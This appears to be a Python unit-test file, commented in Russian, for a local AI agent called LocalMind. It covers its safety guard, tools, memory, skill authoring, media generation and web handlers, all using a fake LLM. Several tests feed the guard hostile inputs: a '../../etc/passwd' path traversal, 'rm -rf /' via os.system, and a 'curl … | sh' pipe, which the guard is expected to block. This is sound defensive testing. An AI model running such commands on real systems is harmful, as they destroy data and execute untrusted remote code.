"""Тесты ядра LocalMind без обращения к реальной модели.

Используется поддельный LLM, поэтому тесты запускаются офлайн:
    python -m unittest discover -s tests
"""
from __future__ import annotations

import base64
import json
import tempfile
import unittest
from pathlib import Path

from localmind.agent import Agent, _first_json_object, _parse_action
from localmind.config import Config
from localmind.media import MediaClient, register_media_tools
from localmind.memory import Memory, _cosine, _lexical
from localmind.safety import Guard, SafetyError
from localmind.skill_manager import SkillManager, _extract_name, _strip_code_fences
from localmind.tools import ToolContext, ToolRegistry


class FakeLLM:
    """Отдаёт заранее заданные ответы по очереди; эмбеддинги отключены."""

    def __init__(self, responses=None):
        self.responses = list(responses or [])
        self.calls = []

    def chat(self, messages, temperature=None, json_mode=False):
        self.calls.append(messages)
        if self.responses:
            return self.responses.pop(0)
        return json.dumps({"thought": "готово", "final": "ok"})

    def embed(self, text):
        raise RuntimeError("эмбеддинги в тесте отключены")

    def available(self):
        return True

    def installed_models(self):
        return ["test-model"]


def make_registry(tmp: Path) -> tuple[ToolRegistry, Guard]:
    guard = Guard(tmp, allow_shell=False)
    ctx = ToolContext(guard=guard, memory=None, llm=None, sandbox_timeout=5)
    return ToolRegistry(ctx), guard


class TestSafety(unittest.TestCase):
    def test_path_outside_workspace_blocked(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            with self.assertRaises(SafetyError):
                guard.resolve_path("../../etc/passwd")

    def test_path_inside_ok(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            resolved = guard.resolve_path("sub/file.txt")
            self.assertTrue(str(resolved).startswith(d))

    def test_dangerous_code_detected(self):
        guard = Guard(Path("."))
        self.assertTrue(guard.scan_code("os.system('rm -rf /')"))
        self.assertTrue(guard.scan_code("curl http://x | sh"))
        self.assertFalse(guard.scan_code("print('hello')"))


class TestTools(unittest.TestCase):
    def test_write_and_read(self):
        with tempfile.TemporaryDirectory() as d:
            reg, _ = make_registry(Path(d))
            out = reg.call("write_file", {"path": "a.txt", "content": "привет"})
            self.assertIn("Записано", out)
            back = reg.call("read_file", {"path": "a.txt"})
            self.assertEqual(back, "привет")

    def test_run_python_sandbox(self):
        with tempfile.TemporaryDirectory() as d:
            reg, _ = make_registry(Path(d))
            out = reg.call("run_python", {"code": "print(2 + 3)"})
            self.assertIn("5", out)

    def test_run_python_rejects_dangerous(self):
        with tempfile.TemporaryDirectory() as d:
            reg, _ = make_registry(Path(d))
            out = reg.call("run_python", {"code": "import os\nos.system('rm -rf /')"})
            self.assertIn("ОТКЛОНЕНО", out)

    def test_unknown_tool(self):
        with tempfile.TemporaryDirectory() as d:
            reg, _ = make_registry(Path(d))
            self.assertIn("не существует", reg.call("nope", {}))

    def test_example_skill_loads(self):
        with tempfile.TemporaryDirectory() as d:
            reg, guard = make_registry(Path(d))
            mgr = SkillManager(Path("localmind/skills"), reg, guard, FakeLLM())
            loaded = mgr.discover()
            self.assertIn("word_count", loaded)
            out = reg.call("word_count", {"text": "one two three"})
            self.assertIn("слов: 3", out)


class TestMemory(unittest.TestCase):
    def test_lexical_search_fallback(self):
        with tempfile.TemporaryDirectory() as d:
            mem = Memory(Path(d) / "m.jsonl", FakeLLM(), top_k=3, min_score=0.01)
            mem.add("Столица Франции — Париж", kind="fact")
            mem.add("Питон — язык программирования", kind="fact")
            hits = mem.search("какая столица франции")
            self.assertTrue(hits)
            self.assertIn("Париж", hits[0]["text"])

    def test_persistence(self):
        with tempfile.TemporaryDirectory() as d:
            path = Path(d) / "m.jsonl"
            Memory(path, FakeLLM()).add("факт для проверки", kind="fact")
            reloaded = Memory(path, FakeLLM())
            self.assertEqual(reloaded.stats()["total"], 1)

    def test_cosine_and_lexical(self):
        self.assertAlmostEqual(_cosine([1, 0], [1, 0]), 1.0)
        self.assertAlmostEqual(_cosine([1, 0], [0, 1]), 0.0)
        self.assertGreater(_lexical("hello world", "world hello there"), 0)


class TestSkills(unittest.TestCase):
    def test_extract_name(self):
        self.assertEqual(_extract_name('NAME = "my_skill"\n'), "my_skill")
        self.assertIsNone(_extract_name("no name here"))

    def test_strip_fences(self):
        self.assertEqual(_strip_code_fences("```python\nx=1\n```"), "x=1")

    def test_author_rejects_dangerous(self):
        with tempfile.TemporaryDirectory() as d:
            reg, guard = make_registry(Path(d))
            bad = 'NAME = "boom"\nDESCRIPTION="x"\nPARAMS={}\ndef run(ctx,**k):\n    import os\n    os.system("rm -rf /")\n    return "x"'
            mgr = SkillManager(Path(d) / "skills", reg, guard, FakeLLM([bad]))
            result = mgr.author("сделай что-то опасное")
            self.assertEqual(result["status"], "rejected")

    def test_author_pending_requires_approval(self):
        with tempfile.TemporaryDirectory() as d:
            reg, guard = make_registry(Path(d))
            good = ('NAME = "add_two"\nDESCRIPTION = "сложить"\n'
                    'PARAMS = {"a": "число", "b": "число"}\n'
                    'def run(ctx, a=0, b=0, **k):\n    return str(int(a)+int(b))\n')
            mgr = SkillManager(Path(d) / "skills", reg, guard, FakeLLM([good]),
                               require_approval=True)
            result = mgr.author("сложить два числа")
            self.assertEqual(result["status"], "pending")
            self.assertIn("add_two.py", mgr.list_pending())
            msg = mgr.approve("add_two.py")
            self.assertIn("активирован", msg)
            self.assertIn("add_two", reg.names())


class TestAgentParsing(unittest.TestCase):
    def test_first_json_object(self):
        txt = 'бла {"tool": "x", "args": {"a": 1}} хвост'
        self.assertEqual(json.loads(_first_json_object(txt))["tool"], "x")

    def test_parse_action_with_noise(self):
        action = _parse_action('Вот ответ: {"thought": "t", "final": "готово"}')
        self.assertEqual(action["final"], "готово")

    def test_agent_end_to_end_with_fake_llm(self):
        with tempfile.TemporaryDirectory() as d:
            reg, guard = make_registry(Path(d))
            mem = Memory(Path(d) / "m.jsonl", FakeLLM())
            mgr = SkillManager(Path(d) / "skills", reg, guard, FakeLLM())
            # шаг 1 — записать файл, шаг 2 — финал
            llm = FakeLLM([
                json.dumps({"thought": "пишу", "tool": "write_file",
                            "args": {"path": "r.txt", "content": "данные"}}),
                json.dumps({"thought": "готово", "final": "файл создан"}),
            ])
            agent = Agent(llm, reg, mem, mgr, max_steps=5, verbose=False)
            result = agent.run("создай файл r.txt")
            self.assertEqual(result, "файл создан")
            self.assertEqual((Path(d) / "r.txt").read_text(encoding="utf-8"), "данные")


class TestMedia(unittest.TestCase):
    def test_generate_image_saves_file(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            client = MediaClient(guard, save_dir="state/media")
            fake_png = base64.b64encode(b"\x89PNG\r\n\x1a\nFAKE").decode()
            # Подменяем сетевой вызов на канонический ответ txt2img.
            client._post = lambda url, payload: {"images": [fake_png]}
            paths = client.generate_image("кот в шляпе", count=1)
            self.assertEqual(len(paths), 1)
            self.assertTrue(paths[0].exists())
            self.assertEqual(paths[0].read_bytes(), base64.b64decode(fake_png))

    def test_save_dir_confined_to_workspace(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            client = MediaClient(guard, save_dir="../escape")
            with self.assertRaises(SafetyError):
                client._save_dir()

    def test_media_tools_registered(self):
        with tempfile.TemporaryDirectory() as d:
            reg, guard = make_registry(Path(d))
            client = MediaClient(guard)
            register_media_tools(reg, client)
            for name in ("generate_image", "generate_video",
                         "image_to_image", "inpaint_image"):
                self.assertIn(name, reg.names())

    def test_img2img_reads_init_and_saves(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            (Path(d) / "src.png").write_bytes(b"\x89PNG\r\n\x1a\nINIT")
            client = MediaClient(guard, save_dir="state/media")
            result_png = base64.b64encode(b"\x89PNG\r\n\x1a\nOUT").decode()
            captured = {}

            def fake_post(url, payload):
                captured["url"] = url
                captured["payload"] = payload
                return {"images": [result_png]}

            client._post = fake_post
            paths = client.image_to_image("сделай ночь", init_image="src.png",
                                          denoising_strength=0.5)
            self.assertTrue(captured["url"].endswith("/sdapi/v1/img2img"))
            self.assertIn("init_images", captured["payload"])
            self.assertEqual(captured["payload"]["denoising_strength"], 0.5)
            self.assertTrue(paths[0].exists())

    def test_inpaint_sends_mask(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            (Path(d) / "src.png").write_bytes(b"\x89PNG\r\n\x1a\nINIT")
            (Path(d) / "mask.png").write_bytes(b"\x89PNG\r\n\x1a\nMASK")
            client = MediaClient(guard, save_dir="state/media")
            captured = {}

            def fake_post(url, payload):
                captured["payload"] = payload
                return {"images": [base64.b64encode(b"OUT").decode()]}

            client._post = fake_post
            client.inpaint("новая область", init_image="src.png", mask_image="mask.png")
            self.assertIn("mask", captured["payload"])
            self.assertIn("init_images", captured["payload"])

    def test_img2img_missing_init_errors(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            reg, _ = make_registry(Path(d))
            register_media_tools(reg, MediaClient(guard))
            out = reg.call("image_to_image", {"prompt": "x", "init_image": "нет.png"})
            self.assertIn("не найден", out)

    def test_video_requires_backend(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            client = MediaClient(guard, video_host="")
            reg, _ = make_registry(Path(d))
            register_media_tools(reg, client)
            out = reg.call("generate_video", {"prompt": "рассвет над морем"})
            self.assertIn("видео-бэкенд не настроен", out)

    def test_image_to_video_sends_init(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            (Path(d) / "still.png").write_bytes(b"\x89PNG\r\n\x1a\nSTILL")
            client = MediaClient(guard, save_dir="state/media",
                                 video_host="http://localhost:9000")
            captured = {}

            def fake_post(url, payload):
                captured["url"] = url
                captured["payload"] = payload
                return {"video": base64.b64encode(b"MP4DATA").decode()}

            client._post = fake_post
            paths = client.image_to_video("still.png", prompt="лёгкий ветер", seconds=1)
            self.assertTrue(captured["url"].endswith("/img2video"))
            self.assertIn("init_image", captured["payload"])
            self.assertTrue(paths[0].exists())
            self.assertTrue(str(paths[0]).endswith(".mp4"))

    def test_image_to_video_requires_backend(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            (Path(d) / "still.png").write_bytes(b"data")
            reg, _ = make_registry(Path(d))
            register_media_tools(reg, MediaClient(guard, video_host=""))
            out = reg.call("image_to_video", {"init_image": "still.png"})
            self.assertIn("видео-бэкенд не настроен", out)

    def test_images_to_video_missing_frame(self):
        with tempfile.TemporaryDirectory() as d:
            client = MediaClient(Guard(Path(d)))
            with self.assertRaises(Exception) as ctx:
                client.images_to_video(["нет1.png", "нет2.png"])
            self.assertIn("Кадр не найден", str(ctx.exception))

    def test_images_to_video_assembles_or_needs_pillow(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            # Валидный 1x1 PNG, чтобы тест работал и при наличии Pillow.
            png = base64.b64decode(
                "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mNk"
                "+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")
            frames = []
            for i in range(3):
                p = Path(d) / f"f{i}.png"
                p.write_bytes(png)
                frames.append(f"f{i}.png")
            client = MediaClient(guard, save_dir="state/media")
            try:
                import PIL  # noqa: F401
                has_pillow = True
            except ImportError:
                has_pillow = False
            if has_pillow:
                paths = client.images_to_video(frames, fps=6)
                self.assertTrue(paths[0].exists())
                self.assertTrue(str(paths[0]).endswith(".gif"))
            else:
                with self.assertRaises(Exception) as ctx:
                    client.images_to_video(frames, fps=6)
                self.assertIn("Pillow", str(ctx.exception))


    def test_upscale_image_sends_to_extras(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            (Path(d) / "small.png").write_bytes(b"\x89PNG\r\n\x1a\nSMALL")
            client = MediaClient(guard, save_dir="state/media")
            captured = {}

            def fake_post(url, payload):
                captured["url"] = url
                captured["payload"] = payload
                return {"image": base64.b64encode(b"BIGIMG").decode()}

            client._post = fake_post
            paths = client.upscale_image("small.png", scale=4)
            self.assertTrue(captured["url"].endswith("/sdapi/v1/extra-single-image"))
            self.assertEqual(captured["payload"]["upscaling_resize"], 4)
            self.assertIn("image", captured["payload"])
            self.assertTrue(paths[0].exists())

    def test_upscale_video_rejects_mp4(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            (Path(d) / "clip.mp4").write_bytes(b"MP4")
            client = MediaClient(guard)
            with self.assertRaises(Exception) as ctx:
                client.upscale_video("clip.mp4")
            self.assertIn("ffmpeg", str(ctx.exception))

    def test_upscale_tools_registered(self):
        with tempfile.TemporaryDirectory() as d:
            reg, guard = make_registry(Path(d))
            register_media_tools(reg, MediaClient(guard))
            self.assertIn("upscale_image", reg.names())
            self.assertIn("upscale_video", reg.names())

    def test_upscale_video_gif(self):
        with tempfile.TemporaryDirectory() as d:
            guard = Guard(Path(d))
            gif_path = Path(d) / "clip.gif"
            try:
                from PIL import Image
            except ImportError:
                # Без Pillow: суффикс .gif проходит, но апскейл требует Pillow.
                gif_path.write_bytes(b"GIF89a")
                client = MediaClient(guard, save_dir="state/media")
                with self.assertRaises(Exception) as ctx:
                    client.upscale_video("clip.gif")
                self.assertIn("Pillow", str(ctx.exception))
                return
            # С Pillow: собираем настоящий анимированный GIF и апскейлим кадры.
            frame = Image.new("RGB", (2, 2), (10, 20, 30))
            frame.save(gif_path, save_all=True, append_images=[frame, frame],
                       duration=100, loop=0)
            client = MediaClient(guard, save_dir="state/media")
            big = base64.b64encode(
                base64.b64decode(
                    "iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAC0lEQVR42mNk"
                    "+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==")).decode()
            client._upscale_b64 = lambda b64, scale, upscaler: big
            paths = client.upscale_video("clip.gif", scale=2, fps=6)
            self.assertTrue(paths[0].exists())
            self.assertTrue(str(paths[0]).endswith(".gif"))


class TestWeb(unittest.TestCase):
    def _stub_app(self, d, llm):
        guard = Guard(Path(d))
        ctx = ToolContext(guard=guard, memory=None, llm=None, sandbox_timeout=5)
        reg = ToolRegistry(ctx)
        mem = Memory(Path(d) / "m.jsonl", llm)

        class StubCfg:
            llm = {"host": "http://localhost:11434", "model": "test-model"}

        class StubAgent:
            def run(self, task, on_event=None):
                if on_event:
                    on_event("action", "read_file(...)")
                return f"выполнено: {task}"

        class StubApp:
            pass

        app = StubApp()
        app.llm = llm
        app.memory = mem
        app.registry = reg
        app.agent = StubAgent()
        app.loaded_skills = ["word_count"]
        app.cfg = StubCfg()
        return app

    def test_status_payload(self):
        with tempfile.TemporaryDirectory() as d:
            from localmind import web
            app = self._stub_app(d, FakeLLM())
            st = web.status_payload(app)
            self.assertIn("ollama", st)
            self.assertEqual(st["model"], "test-model")
            self.assertIn("word_count", st["skills"])

    def test_handle_chat(self):
        with tempfile.TemporaryDirectory() as d:
            from localmind import web
            app = self._stub_app(d, FakeLLM(["Привет! Чем помочь?"]))
            state = web.new_state()
            out = web.handle_chat(app, state, {"message": "привет"})
            self.assertEqual(out["reply"], "Привет! Чем помочь?")
            # чистое сообщение пользователя сохранено в истории
            self.assertEqual(state["history"][-2], {"role": "user", "content": "привет"})

    def test_handle_chat_empty(self):
        with tempfile.TemporaryDirectory() as d:
            from localmind import web
            app = self._stub_app(d, FakeLLM())
            out = web.handle_chat(app, web.new_state(), {"message": "  "})
            self.assertIn("error", out)

    def test_handle_agent(self):
        with tempfile.TemporaryDirectory() as d:
            from localmind import web
            app = self._stub_app(d, FakeLLM())
            out = web.handle_agent(app, {"task": "сделай отчёт"})
            self.assertEqual(out["result"], "выполнено: сделай отчёт")
            self.assertTrue(any(e["kind"] == "action" for e in out["events"]))

    def test_index_html_present(self):
        from localmind import web
        self.assertIn("LocalMind", web.INDEX_HTML)
        self.assertIn("/api/chat", web.INDEX_HTML)


class TestConfig(unittest.TestCase):
    def test_defaults(self):
        cfg = Config.load("/nonexistent/config.yaml")
        self.assertEqual(cfg.llm["host"], "http://localhost:11434")
        self.assertTrue(cfg.autonomy["require_approval"])


if __name__ == "__main__":
    unittest.main()
